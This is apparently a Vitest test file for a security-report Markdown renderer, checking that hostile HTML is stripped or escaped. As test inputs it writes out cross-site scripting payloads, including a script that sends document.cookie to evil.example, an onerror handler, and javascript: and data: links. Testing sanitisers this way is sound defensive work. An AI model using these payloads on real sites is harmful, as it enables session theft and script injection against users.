import { describe, expect, it } from "vitest";

import { escapeHtml, markdownToPlainText, renderMarkdown } from "./markdown.js";

/**
 * Markdown rendering.
 *
 * Report Markdown quotes payloads taken from research targets, so it is treated
 * as hostile. These tests assert that a payload which survives into a report
 * renders as visible text and never as executable markup.
 */

describe("sanitisation", () => {
  it("drops a script tag, leaving only inert text", async () => {
    const html = await renderMarkdown(
      "Reproduction: <script>fetch('https://evil.example/'+document.cookie)</script>",
    );

    // The tag is gone at the AST boundary. What remains is the script's text
    // content, which GFM autolinks — an ordinary anchor that does nothing
    // until a researcher clicks it and confirms the external-link dialog.
    expect(html).not.toContain("<script");
    expect(html).not.toContain("</script>");
    expect(html).toContain("<a href=");
  });

  it("drops an inline event handler", async () => {
    const html = await renderMarkdown('<img src=x onerror="alert(1)">');

    expect(html).not.toContain("onerror");
    expect(html).not.toContain("<img");
  });

  it("drops an iframe", async () => {
    const html = await renderMarkdown('<iframe src="https://evil.example">');

    expect(html).not.toContain("<iframe");
  });

  it("drops inline SVG, which is a document format with scripting", async () => {
    const html = await renderMarkdown("<svg><script>alert(1)</script></svg>");

    expect(html).not.toContain("<svg");
    expect(html).not.toContain("<script");
  });

  it("drops a javascript: link", async () => {
    const html = await renderMarkdown("[click](javascript:alert(1))");

    expect(html).not.toContain("javascript:");
  });

  it("drops a data: link", async () => {
    const html = await renderMarkdown(
      "[click](data:text/html,<script>alert(1)</script>)",
    );

    expect(html).not.toContain("data:text/html");
  });

  it("keeps an https link", async () => {
    const html = await renderMarkdown("[advisory](https://example.com/a)");

    expect(html).toContain('href="https://example.com/a"');
  });

  it("keeps a mailto link", async () => {
    const html = await renderMarkdown("[contact](mailto:security@example.com)");

    expect(html).toContain("mailto:security@example.com");
  });

  it("does not fetch a remote image", async () => {
    const html = await renderMarkdown(
      "![shot](https://evil.example/track.png)",
    );

    expect(html).not.toContain("evil.example");
  });
});

describe("ordinary Markdown", () => {
  it("renders headings, lists and emphasis", async () => {
    const html = await renderMarkdown(
      "# Title\n\n- one\n- two\n\n**bold** and *italic*",
    );

    // Headings carry a namespaced anchor so a section can be linked to.
    expect(html).toContain('<h1 id="cv-h-title">Title</h1>');
    expect(html).toContain("<li>one</li>");
    expect(html).toContain("<strong>bold</strong>");
  });

  it("renders a fenced code block with its language class", async () => {
    const html = await renderMarkdown(
      "```http\nPOST /api/export HTTP/1.1\n```",
    );

    expect(html).toContain("<pre>");
    expect(html).toContain("language-http");
    // Highlighted, so the request is split across token spans. The text still
    // has to survive intact once they are removed.
    expect(html).toContain("hljs-");
    expect(html.replace(/<[^>]+>/g, "")).toContain("POST /api/export HTTP/1.1");
  });

  it("escapes payload text inside a code block", async () => {
    const html = await renderMarkdown("```\n<script>alert(1)</script>\n```");

    expect(html).toContain("&#x3C;script>");
    expect(html).not.toContain("<script>alert");
  });

  it("renders GFM tables", async () => {
    const html = await renderMarkdown(
      "| Version | Status |\n| --- | --- |\n| 4.1.6 | Vulnerable |",
    );

    expect(html).toContain("<table>");
    expect(html).toContain("Vulnerable");
  });
});

describe("escapeHtml", () => {
  it("escapes every character that could break out of a fragment", () => {
    expect(escapeHtml(`<a href="x" onclick='y'>&</a>`)).toBe(
      "&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;&lt;/a&gt;",
    );
  });
});

describe("markdownToPlainText", () => {
  it("strips syntax for PDF metadata and search snippets", () => {
    expect(
      markdownToPlainText(
        "## Impact\n\nAn **unauthenticated** [attacker](https://x) can.",
      ),
    ).toBe("Impact An unauthenticated attacker can.");
  });

  it("removes code blocks entirely", () => {
    expect(markdownToPlainText("Before\n```\npayload\n```\nAfter")).toBe(
      "Before After",
    );
  });

  it("removes tilde-fenced code blocks from metadata and snippets", () => {
    expect(markdownToPlainText("Before\n~~~http\nsecret payload\n~~~\nAfter")).toBe(
      "Before After",
    );
  });

  it("removes raw HTML markup and comments while preserving text", () => {
    expect(
      markdownToPlainText(
        'Impact <span class="severity">critical</span><!-- internal note --> now.',
      ),
    ).toBe("Impact critical now.");
  });
});
